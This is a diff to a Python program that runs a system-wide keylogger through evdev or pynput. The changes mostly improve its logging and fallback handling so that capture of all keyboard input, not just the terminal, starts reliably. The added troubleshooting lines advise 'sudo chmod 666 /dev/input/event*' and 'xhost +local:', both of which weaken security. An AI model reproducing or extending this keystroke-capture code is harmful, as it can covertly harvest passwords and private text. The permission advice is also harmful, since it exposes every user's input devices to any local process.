@@ -245,12 +245,17 @@ def evdev_keylogger_worker(device_path):
                         # Don't crash on individual key errors
                         pass
                         
-    except PermissionError:
-        log_activity("ERROR", f"Permission denied for device {device_path}. May need to add user to input group: sudo usermod -a -G input $USER")
+    except PermissionError as e:
+        log_activity("ERROR", f"❌ Permission denied for device {device_path}")
+        log_activity("ERROR", f"   Error: {e}")
+        log_activity("ERROR", "   Fix: sudo usermod -a -G input $USER (then logout/login)")
+        log_activity("ERROR", "   Or: sudo chmod 666 /dev/input/event* (temporary fix)")
     except OSError as e:
-        log_activity("ERROR", f"Device {device_path} error: {e}")
+        log_activity("ERROR", f"❌ Device {device_path} error: {e}")
     except Exception as e:
-        log_activity("ERROR", f"Evdev keylogger error for {device_path}: {e}")
+        import traceback
+        log_activity("ERROR", f"❌ Evdev keylogger error for {device_path}: {e}")
+        log_activity("ERROR", f"   Traceback: {traceback.format_exc()[:300]}")
     finally:
         if device:
             try:
@@ -291,7 +296,9 @@ def start_evdev_keylogger():
                 continue
         
         if not devices:
-            log_activity("ERROR", "No keyboard devices found for evdev keylogger")
+            log_activity("ERROR", "❌ No keyboard devices found for evdev keylogger")
+            log_activity("ERROR", "   Check permissions: ls -l /dev/input/event*")
+            log_activity("ERROR", "   Add user to input group: sudo usermod -a -G input $USER")
             return False
         
         log_activity("SYSTEM", f"Found {len(devices)} keyboard device(s) for evdev keylogger")
@@ -311,10 +318,12 @@ def start_evdev_keylogger():
                 log_activity("ERROR", f"Failed to start evdev keylogger for {device_path}: {e}")
         
         if evdev_keylogger_devices:
-            log_activity("SYSTEM", f"Evdev keylogger started - monitoring {len(evdev_keylogger_devices)} device(s)")
+            log_activity("SYSTEM", f"✅ Evdev keylogger started - monitoring {len(evdev_keylogger_devices)} device(s)")
             return True
         else:
-            log_activity("ERROR", "Failed to start evdev keylogger on any device")
+            log_activity("ERROR", "❌ Failed to start evdev keylogger on any device")
+            log_activity("ERROR", "   Check permissions: ls -l /dev/input/event*")
+            log_activity("ERROR", "   Add user to input group: sudo usermod -a -G input $USER")
             return False
             
     except Exception as e:
@@ -333,17 +342,19 @@ def start_system_keylogger():
         log_activity("SYSTEM", "Keylogger already running")
         return
     
-    # Detect if we're on Wayland
+    # Log diagnostic information
     is_wayland = os.environ.get('XDG_SESSION_TYPE') == 'wayland' or os.environ.get('WAYLAND_DISPLAY')
+    log_activity("SYSTEM", f"Keylogger diagnostics: Wayland={bool(is_wayland)}, PYNPUT_AVAILABLE={PYNPUT_AVAILABLE}, EVDEV_AVAILABLE={EVDEV_AVAILABLE}")
     
     # On Wayland, prefer evdev; on X11, prefer pynput
     if is_wayland and EVDEV_AVAILABLE:
         log_activity("SYSTEM", "Wayland detected - using evdev keylogger")
         keylogger_running = True
         if start_evdev_keylogger():
+            log_activity("SYSTEM", "✅ Evdev keylogger started successfully")
             return
         else:
-            log_activity("SYSTEM", "Evdev keylogger failed, trying pynput as fallback...")
+            log_activity("ERROR", "❌ Evdev keylogger failed, trying pynput as fallback...")
             keylogger_running = False
     
     # Try pynput (works better on X11, may work on Wayland with permissions)
@@ -353,8 +364,11 @@ def start_system_keylogger():
             log_activity("SYSTEM", "pynput not available - trying evdev keylogger")
             keylogger_running = True
             if start_evdev_keylogger():
+                log_activity("SYSTEM", "✅ Evdev keylogger started successfully (fallback)")
                 return
-        log_activity("ERROR", "Neither pynput nor evdev available - keylogger disabled")
+        log_activity("ERROR", "❌ Neither pynput nor evdev available - keylogger disabled")
+        log_activity("ERROR", "   Install dependencies: pip install pynput evdev")
+        log_activity("ERROR", "   Or add user to input group for evdev: sudo usermod -a -G input $USER")
         return
     
     try:
@@ -377,7 +391,7 @@ def start_system_keylogger():
         
         # Verify it's running
         if keylogger_listener.is_alive():
-            log_activity("SYSTEM", "Keylogger started successfully - capturing ALL keyboard input")
+            log_activity("SYSTEM", "✅ Keylogger started successfully - capturing ALL keyboard input")
             log_activity("SYSTEM", "Keylogger is monitoring system-wide (not just terminal)")
             
             # Start worker thread to keep listener alive
@@ -388,36 +402,40 @@ def start_system_keylogger():
             log_activity("SYSTEM", "Keylogger test: If you see this, keylogger is active")
             log_activity("SYSTEM", "Press any key to test - it should appear in the log")
         else:
-            log_activity("ERROR", "Keylogger failed to start - listener not alive")
+            log_activity("ERROR", "❌ Keylogger failed to start - listener not alive")
             keylogger_running = False
             keylogger_listener = None
             # Try evdev as fallback
             if EVDEV_AVAILABLE:
                 log_activity("SYSTEM", "Trying evdev keylogger as fallback...")
                 if start_evdev_keylogger():
+                    log_activity("SYSTEM", "✅ Evdev keylogger started successfully (fallback)")
                     keylogger_running = True
                     return
             
     except Exception as e:
-        log_activity("ERROR", f"Failed to start pynput keylogger: {e}")
+        log_activity("ERROR", f"❌ Failed to start pynput keylogger: {e}")
         keylogger_running = False
         keylogger_listener = None
         # Try to get more details about the error
         import traceback
         error_details = traceback.format_exc()
-        log_activity("ERROR", f"Keylogger error details: {error_details[:200]}")
+        log_activity("ERROR", f"Keylogger error details: {error_details[:500]}")
         
         # Try evdev as fallback
         if EVDEV_AVAILABLE:
             log_activity("SYSTEM", "Trying evdev keylogger as fallback...")
             if start_evdev_keylogger():
+                log_activity("SYSTEM", "✅ Evdev keylogger started successfully (fallback)")
                 keylogger_running = True
                 return
         
         # On Linux, might need X11 permissions
-        log_activity("ERROR", "Note: On Linux, keylogger may need X11 access permissions")
-        log_activity("ERROR", "Try running with: xhost +local: or check DISPLAY variable")
-        log_activity("ERROR", "On Wayland, may need to add user to input group: sudo usermod -a -G input $USER")
+        log_activity("ERROR", "⚠️  Keylogger setup failed. Troubleshooting:")
+        log_activity("ERROR", "   1. Install dependencies: pip install pynput evdev")
+        log_activity("ERROR", "   2. On Wayland: sudo usermod -a -G input $USER (then logout/login)")
+        log_activity("ERROR", "   3. On X11: xhost +local: or check DISPLAY variable")
+        log_activity("ERROR", "   4. Check permissions: ls -l /dev/input/event*")
 
 def stop_system_keylogger():
     """Stop system-wide keylogger"""
